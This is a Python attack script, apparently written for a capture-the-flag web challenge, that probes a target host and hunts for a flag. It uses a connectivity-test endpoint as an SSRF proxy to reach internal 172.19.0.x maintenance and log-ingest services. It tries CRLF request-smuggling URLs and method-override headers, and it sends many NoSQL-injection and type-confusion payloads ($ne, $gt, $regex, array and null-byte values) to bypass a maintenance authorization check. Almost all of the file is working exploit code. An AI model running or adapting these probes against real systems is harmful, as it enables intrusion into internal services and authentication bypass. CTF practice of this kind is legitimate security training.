#!/usr/bin/env python3
import http.cookiejar
import json
import os
import re
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request

HOST = "9taux6shw8cpbvs5.instances.ctfcup.online"
BASE = f"http://{HOST}"
OUT = "/tmp/web-out"
os.makedirs(OUT, exist_ok=True)
JSONL = os.path.join(OUT, "probe6.jsonl")
SUMMARY = os.path.join(OUT, "SUMMARY6.txt")
ctx = ssl._create_unverified_context()
FLAG_RE = re.compile(r"ctfcup\{[^}]+\}")
jf = open(JSONL, "w", encoding="utf-8", buffering=1)
sf = open(SUMMARY, "w", encoding="utf-8", buffering=1)

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

def make_opener(cookies=False):
    handlers = [NoRedirect, urllib.request.HTTPSHandler(context=ctx)]
    jar = None
    if cookies:
        jar = http.cookiejar.CookieJar()
        handlers.append(urllib.request.HTTPCookieProcessor(jar))
    return urllib.request.build_opener(*handlers), jar

plain, _ = make_opener(False)

def emit(rec):
    rec = dict(rec)
    if isinstance(rec.get("body"), (bytes, bytearray)):
        rec["body"] = bytes(rec["body"]).decode("utf-8", "replace")
    if isinstance(rec.get("body"), str) and len(rec["body"]) > 40000:
        rec["body"] = rec["body"][:40000]
    line = json.dumps(rec, ensure_ascii=False)
    jf.write(line + "\n")
    flags = FLAG_RE.findall(line)
    if flags:
        sf.write(f"FLAG {flags} :: {line[:12000]}\n")
    sf.flush()
    return rec

def note(s):
    print(s, flush=True)
    sf.write(s + "\n")
    sf.flush()

def fetch(opener, url, method="GET", data=None, headers=None, timeout=15):
    h = {"User-Agent": "Mozilla/5.0 method-probe", "Accept": "*/*"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    t = time.time()
    try:
        with opener.open(req, timeout=timeout) as r:
            return {"url": url, "method": method, "request_headers": h, "request_body": (data.decode("utf-8","replace") if isinstance(data, (bytes,bytearray)) else data), "status": r.status, "headers": list(r.headers.items()), "body": r.read(2_000_000), "elapsed": round(time.time()-t,3)}
    except urllib.error.HTTPError as e:
        try: body = e.read(2_000_000)
        except Exception: body = b""
        return {"url": url, "method": method, "request_headers": h, "request_body": (data.decode("utf-8","replace") if isinstance(data, (bytes,bytearray)) else data), "status": e.code, "headers": list(e.headers.items()) if e.headers else [], "body": body, "elapsed": round(time.time()-t,3)}
    except Exception as e:
        return {"url": url, "method": method, "request_headers": h, "request_body": (data.decode("utf-8","replace") if isinstance(data, (bytes,bytearray)) else data), "status": None, "error": f"{type(e).__name__}: {e}", "body": b"", "elapsed": round(time.time()-t,3)}

def hval(rec, name):
    for k,v in rec.get("headers",[]):
        if k.lower()==name.lower(): return v
    return ""

def cookies(rec):
    return [v for k,v in rec.get("headers",[]) if k.lower()=="set-cookie"]

def text(rec):
    b=rec.get("body",b"")
    return b if isinstance(b,str) else b.decode("utf-8","replace")

AGENT_VALIDATE = "http://mme-monitor@172.19.0.2:8081/v1/maintenance/validate"
AGENT_HEALTH = "http://mme-monitor@172.19.0.2:8081/v1/health"
LOG_INGEST = "http://mme-monitor@172.19.0.5:8082/v1/ingest"
LOG_HEALTH = "http://mme-monitor@172.19.0.5:8082/v1/health"
SELF_MAINT = "http://mme-monitor@172.19.0.4:8080/maintenance"

note("===== CONNECTIVITY METHOD/BODY FORWARDING TESTS =====")
body_variants = [
    ("none", None, {}),
    ("form-ticket", urllib.parse.urlencode({"ticket":"test","device_id":"FEMTO-042"}).encode(), {"Content-Type":"application/x-www-form-urlencoded"}),
    ("json-ticket", json.dumps({"ticket":"test","device_id":"FEMTO-042"}).encode(), {"Content-Type":"application/json"}),
    ("json-valid", json.dumps({"ticket":"test","device_id":"FEMTO-042","valid":True,"active":True}).encode(), {"Content-Type":"application/json"}),
    ("text", b"ticket=test", {"Content-Type":"text/plain"}),
]
for target_name,target in [("agent-validate",AGENT_VALIDATE),("log-ingest",LOG_INGEST),("self-maintenance",SELF_MAINT),("agent-health",AGENT_HEALTH)]:
    for method in ["GET","POST","PUT","PATCH","OPTIONS","HEAD"]:
        for bn,data,headers in body_variants:
            # To bound requests, only GET gets none; non-GET gets all.
            if method=="GET" and bn!="none": continue
            url = BASE + "/api/diagnostics/connectivity-test?" + urllib.parse.urlencode({"target":target})
            rec = fetch(plain,url,method=method,data=data,headers=headers)
            rec.update(phase="connectivity-forward",target_name=target_name,target=target,body_variant=bn)
            emit(rec)
            note(f"{method} {target_name} body={bn} -> outer={rec.get('status')} loc={hval(rec,'Location')!r} body={text(rec)[:1000]!r}")
    # target in POST form/JSON instead of query
    for bn,data,headers in [
        ("form-target", urllib.parse.urlencode({"target":target,"ticket":"test","device_id":"FEMTO-042"}).encode(), {"Content-Type":"application/x-www-form-urlencoded"}),
        ("json-target", json.dumps({"target":target,"ticket":"test","device_id":"FEMTO-042"}).encode(), {"Content-Type":"application/json"}),
    ]:
        rec = fetch(plain,BASE+"/api/diagnostics/connectivity-test",method="POST",data=data,headers=headers)
        rec.update(phase="connectivity-forward",target_name=target_name,target=target,body_variant=bn)
        emit(rec)
        note(f"POST {target_name} body={bn} -> outer={rec.get('status')} body={text(rec)[:1000]!r}")
    # Method override headers on GET query
    for hn in ["X-HTTP-Method-Override","X-Method-Override","X-HTTP-Method"]:
        url = BASE + "/api/diagnostics/connectivity-test?" + urllib.parse.urlencode({"target":target})
        rec = fetch(plain,url,method="GET",headers={hn:"POST"})
        rec.update(phase="connectivity-forward",target_name=target_name,target=target,body_variant="override-"+hn)
        emit(rec)
        note(f"GET+{hn}=POST {target_name} -> outer={rec.get('status')} body={text(rec)[:1000]!r}")

note("\n===== CONNECTIVITY EXTRA PARAMS (method/body/data/header guesses) =====")
extra_templates = []
for target_name,target in [("agent-validate",AGENT_VALIDATE),("log-ingest",LOG_INGEST)]:
    param_sets = [
        {"target":target,"method":"POST"},
        {"target":target,"method":"POST","body":json.dumps({"ticket":"test","device_id":"FEMTO-042"})},
        {"target":target,"method":"POST","data":json.dumps({"ticket":"test","device_id":"FEMTO-042"})},
        {"target":target,"method":"POST","json":json.dumps({"ticket":"test","device_id":"FEMTO-042"})},
        {"target":target,"method":"POST","ticket":"test","device_id":"FEMTO-042"},
        {"target":target,"body":json.dumps({"ticket":"test","device_id":"FEMTO-042"})},
        {"target":target,"data":json.dumps({"ticket":"test","device_id":"FEMTO-042"})},
        {"target":target,"ticket":"test","device_id":"FEMTO-042"},
        {"target":target,"headers":json.dumps({"Content-Type":"application/json"})},
    ]
    for i,params in enumerate(param_sets):
        url=BASE+"/api/diagnostics/connectivity-test?"+urllib.parse.urlencode(params)
        rec=fetch(plain,url)
        rec.update(phase="connectivity-extra",target_name=target_name,target=target,param_set=i)
        emit(rec)
        note(f"extra {target_name} set={i} -> {rec.get('status')} body={text(rec)[:1000]!r}")

note("\n===== GET TARGET CRLF / METHOD SMUGGLING SANITY =====")
smuggles = [
    "http://mme-monitor@172.19.0.2:8081/v1/maintenance/validate%20HTTP/1.1%0d%0aHost:%20172.19.0.2%0d%0aContent-Length:%200%0d%0a%0d%0aPOST%20/v1/maintenance/validate%20HTTP/1.1%0d%0aHost:%20172.19.0.2%0d%0aContent-Length:%200%0d%0a%0d%0a",
    "http://mme-monitor@172.19.0.2:8081/v1/maintenance/validate%0d%0aX-Test:%20x",
    "http://mme-monitor@172.19.0.2:8081/v1/maintenance/validate;method=POST",
    "http://mme-monitor@172.19.0.2:8081/v1/maintenance/validate?_method=POST",
    "http://mme-monitor@172.19.0.2:8081/v1/maintenance/validate?ticket=test&device_id=FEMTO-042",
]
for target in smuggles:
    url=BASE+"/api/diagnostics/connectivity-test?"+urllib.parse.urlencode({"target":target})
    rec=fetch(plain,url)
    rec.update(phase="connectivity-smuggle",target=target)
    emit(rec)
    note(f"smuggle -> {rec.get('status')} body={text(rec)[:1200]!r}")

note("\n===== DIRECT WEB MAINTENANCE TYPE/CONFUSION TESTS =====")

def maint_attempt(label,data,headers,method="POST",path="/maintenance"):
    op,jar=make_opener(True)
    rec=fetch(op,BASE+path,method=method,data=data,headers=headers)
    rec.update(phase="maintenance-type",label=label,jar=[f"{c.name}={c.value}" for c in jar])
    emit(rec)
    follow=None; unlocked=False
    if rec.get("status") in {301,302,303,307,308} or cookies(rec):
        follow=fetch(op,urllib.parse.urljoin(BASE+"/",hval(rec,"Location") or "/"))
        follow.update(phase="maintenance-type-follow",label=label)
        emit(follow)
        ft=text(follow)
        unlocked=("locked · maintenance authorization required" not in ft and "Maintenance console" in ft)
    m=re.search(r'<p class="error">(.*?)</p>',text(rec),re.S)
    note(f"MAINT {label!r} -> {rec.get('status')} loc={hval(rec,'Location')!r} cookies={cookies(rec)} unlocked={unlocked} err={(m.group(1).strip() if m else '')!r} bodylen={len(text(rec))}")
    return unlocked

form_ct={"Content-Type":"application/x-www-form-urlencoded"}
json_ct={"Content-Type":"application/json"}
attempts=[]
for val in ["test","FEMTO-042","active","true","null","[]","{}","{\"valid\":true}","{\"$ne\":null}","{\"$gt\":\"\"}","{\"$regex\":\".*\"}"]:
    attempts.append((f"form-string:{val}",urllib.parse.urlencode({"ticket":val}).encode(),form_ct))
for payload in [
    {"ticket":True},{"ticket":None},{"ticket":0},{"ticket":1},{"ticket":[]},{"ticket":{}},
    {"ticket":{"valid":True}},{"ticket":{"$ne":None}},{"ticket":{"$gt":""}},{"ticket":{"$regex":".*"}},
    {"ticket":["test"]},{"ticket":"test","valid":True},{"ticket":"test","active":True},
    {"ticket":"test","device_id":"FEMTO-042","valid":True},{"device_id":"FEMTO-042","valid":True},
    {"ticket":"test","role":"maintenance"},{"ticket":"test","authorized":True},
]:
    attempts.append((f"json:{payload}",json.dumps(payload).encode(),json_ct))
for raw in [
    "ticket=test&valid=true", "ticket=test&active=true", "ticket=test&authorized=true",
    "ticket[]=test", "ticket[valid]=true", "ticket[$ne]=x", "ticket[$gt]=",
    "ticket=test&ticket=", "ticket=&ticket=test", "ticket=test%00", "ticket=%20test%20",
    "ticket=test&device_id=FEMTO-042&valid=true", "ticket=test&device=FEMTO-042&valid=true",
]:
    attempts.append((f"rawform:{raw}",raw.encode(),form_ct))
for label,data,headers in attempts:
    if maint_attempt(label,data,headers):
        note("UNLOCKED with "+label)
        break

note("\n===== DONE =====")
jf.close(); sf.close()
